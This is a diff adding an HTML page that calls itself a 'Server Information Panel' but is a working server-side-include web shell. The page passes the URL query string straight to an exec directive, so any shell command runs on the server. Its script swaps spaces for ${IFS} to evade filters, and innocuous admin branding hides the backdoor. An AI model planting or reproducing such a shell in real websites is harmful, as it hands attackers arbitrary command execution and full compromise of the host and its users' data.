@@ -1,0 +1,55 @@
+<!-- Author : ./Fake Root -->
+<!--#config errmsg="[Operation Failed]"-->
+<!--#set var="null_val" value=""--><!--#set var="shl" value="$QUERY_STRING_UNESCAPED"--><!--#if expr="$QUERY_STRING_UNESCAPED = $null_val"--><!--#set var="shl" value="whoami"--><!--#endif-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Server Information Panel</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<style>
+body {font-family: 'Courier New', monospace; font-size: 14px; background: #f5f5f5; color: #333;}
+.text-input {padding: 5px; border: 1px solid #ddd; width: 60%; max-width: 500px;}
+.btn {padding: 5px 15px; background: #4CAF50; color: white; border: none; cursor: pointer;}
+.output-area {width: 95%; height: 300px; font-family: monospace; background: #fff; border: 1px solid #ddd;}
+.server-info {color: #2E7D32; font-weight: bold;}
+</style>
+<script>
+function processRequest() {
+    let cmdInput = document.getElementById('cmdInput');
+    let processedCmd = cmdInput.value.replace(/\s+/g, '${IFS}');
+    window.location.href = "<!--#echo var='DOCUMENT_NAME'-->" + "?" + encodeURIComponent(processedCmd);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('cmdInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') processRequest();
+    });
+});
+</script>
+</head>
+<body>
+<div class="container">
+    <h2>Server Information Console</h2>
+    <p>Current server: <span class="server-info"><!--#exec cmd="uname -nr"--></span></p>
+    
+    <div class="control-panel">
+        <label for="cmdInput">Query:</label>
+        <input type="text" id="cmdInput" class="text-input" placeholder="Enter server query">
+        <button onclick="processRequest()" class="btn">Submit</button>
+    </div>
+    
+    <div class="output-section">
+        <h3>Query Results:</h3>
+        <p>Executed: <strong><!--#echo var="shl"--></strong></p>
+        <textarea class="output-area" readonly><!--#exec cmd="$shl"--></textarea>
+    </div>
+    
+    <footer>
+        <p>Server Management Interface v1.2</p>
+        <p>&copy; <script>document.write(new Date().getFullYear())</script> System Administration Team</p>
+    </footer>
+</div>
+</body>
+</html>
